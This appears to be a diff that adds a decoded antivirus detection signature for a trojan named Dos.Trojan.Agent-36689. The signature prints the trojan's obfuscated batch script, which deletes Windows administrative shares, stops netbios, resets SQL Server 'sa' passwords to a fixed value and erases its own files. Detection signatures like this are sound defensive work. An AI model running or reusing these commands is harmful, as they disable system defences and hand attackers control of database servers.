@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36689
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off set a=del set b=lete set c=net set d=share set e=stop %c% %d% c$ /%a%%b% /y %c% %d% d$ /%a%%b% /y %c% %d% e$ /%a%%b% /y %c% %d% f$ /%a%%b% /y %c% %d% ipc$ /%a%%b% %c% %d% admin$ /%a%%b% %c% %e% netbios lssas -u sa -p "sa" -q "sp_password sa,timtm333,sa lssas -u sa -p "" -q "sp_password null,timtm333,sa erase sqpro*.bat 
